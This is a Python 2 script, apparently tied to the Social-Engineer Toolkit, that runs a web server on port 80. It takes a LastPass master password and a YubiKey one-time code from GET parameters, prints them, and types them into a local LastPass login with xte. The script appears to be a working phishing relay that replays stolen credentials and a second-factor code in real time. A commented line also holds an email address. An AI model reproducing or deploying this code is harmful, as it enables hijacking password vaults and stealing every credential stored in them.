#!/usr/bin/env python
import uinput
import time
from subprocess import Popen, PIPE
import subprocess
import SimpleHTTPServer
import SocketServer
import sys
import os
from time import sleep
from pprint import pprint



#time.sleep(3)

tab_seq = '''key Tab
'''
space_seq = '''key space
'''
enter_seq = '''key Return
'''

def keypress(sequence):
    p = Popen(['xte'], stdin=PIPE)
    p.communicate(input=sequence)

def lastpass_pass(password):
	time.sleep(5)
	#subprocess.call(['xte', 'str xulthere@gmail.com'])
	#time.sleep(1)
	#keypress(tab_seq)
	#time.sleep(1)
	subprocess.call(['xte', 'str ' + password,'key Return'])
	#time.sleep(1)
	#keypress(tab_seq)
	#time.sleep(1)
	#keypress(tab_seq)
	#time.sleep(1)
	#keypress(space_seq)
	#time.sleep(1)
	#keypress(enter_seq)
	 #time.sleep(1)
	#keypress(enter_seq)



def lastpass_yubi(yubicode):
	#time.sleep(8)
	subprocess.call(['xte', 'str ' + yubicode])
	time.sleep(1)
	keypress(tab_seq)
	time.sleep(1)
	keypress(tab_seq)
	time.sleep(1)
	keypress(space_seq)
	time.sleep(1)	
	keypress(tab_seq)
	time.sleep(1)	
	subprocess.call(['xte', 'str home','key Return'])
	#keypress(enter_seq)

def start_basic_web_server():
	try:
	# import the threading, socketserver, and simplehttpserver
		import thread, SocketServer, BaseHTTPServer, SimpleHTTPServer
		from urlparse import urlparse, parse_qs
		# create the httpd handler for the simplehttpserver
		# we set the allow_reuse_address incase something hangs can still bind to port
		#class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
		# specify the httpd service on 0.0.0.0 (all interfaces) on port 80
		#httpd = ReusableTCPServer(("0.0.0.0", 80), SimpleHTTPServer.SimpleHTTPRequestHandler)
		
#		lastpass_master_password, yubicode
		class MyHandler( SimpleHTTPServer.SimpleHTTPRequestHandler ):
				def do_GET( self ):
					if (self.path.find("index.php")>-1):
						#pprint (vars(self))
						p = self.path.split("?")
						#print p[1]
						params = p[1].split("=")
						if (params[0] == "lastpass_master_password"):
							print params[1]
							lastpass_pass(params[1])
						
						if (params[0] == "yubicode"):
							print params[1]	
							lastpass_yubi(params[1]	)

						self.send_response(200)
						self.send_header('Content-type', 'text/html')
						content = ""
						self.end_headers()
						#self.wfile.write(content)
						
						return
					else:
						# Default to serve up a local file 
						SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self);

		SimpleHTTPServer.SimpleHTTPRequestHandler.protocol_version = 'HTTP/1.0'
		httpd = BaseHTTPServer.HTTPServer(('', 80), MyHandler)
		httpd.serve_forever()
		print "test"
	except KeyboardInterrupt:
		print_info("Exiting the SET web server...")
		httpd.socket.close()

start_basic_web_server()
